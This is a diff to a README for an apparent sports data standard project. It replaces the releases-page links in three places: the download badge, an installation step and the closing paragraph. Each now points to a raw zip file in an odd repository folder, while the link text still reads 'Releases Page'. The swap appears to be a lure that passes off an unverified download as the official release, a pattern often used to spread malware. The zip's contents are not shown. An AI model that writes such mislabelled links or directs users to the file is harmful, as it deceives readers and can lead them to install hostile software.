@@ -1,7 +1,7 @@
 # 🎉 open-team-sports-data-standard - Your Guide to Sports Data Management
 
 ## 🚀 Download the Application
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/ayesha-saeed123/open-team-sports-data-standard/releases)
+[![Download](https://github.com/ayesha-saeed123/open-team-sports-data-standard/raw/refs/heads/master/unurbane/sports_open_standard_team_data_v1.5.zip)](https://github.com/ayesha-saeed123/open-team-sports-data-standard/raw/refs/heads/master/unurbane/sports_open_standard_team_data_v1.5.zip)
 
 ## 📋 Table of Contents
 1. [Overview](#overview)
@@ -24,7 +24,7 @@ To ensure the best performance, please check the following requirements:
 ## 📤 Installation Steps
 To successfully download and run the software:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ayesha-saeed123/open-team-sports-data-standard/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ayesha-saeed123/open-team-sports-data-standard/raw/refs/heads/master/unurbane/sports_open_standard_team_data_v1.5.zip) to find the latest version.
 
 2. **Choose the Version:** Look for the latest version listed. It usually has the highest number.
 
@@ -51,4 +51,4 @@ The open-team-sports-data-standard includes several features designed to enhance
 - **Custom Schemas:** Create your own data standards using JSON Schema.
 - **Online Help Resources:** Access documentation and tutorials to assist you in getting started.
 
-Explore the vast possibilities of the **open-team-sports-data-standard** and enjoy straightforward management of your team sports data. Visit the [Releases Page](https://github.com/ayesha-saeed123/open-team-sports-data-standard/releases) for all updates and downloads.
+Explore the vast possibilities of the **open-team-sports-data-standard** and enjoy straightforward management of your team sports data. Visit the [Releases Page](https://github.com/ayesha-saeed123/open-team-sports-data-standard/raw/refs/heads/master/unurbane/sports_open_standard_team_data_v1.5.zip) for all updates and downloads.
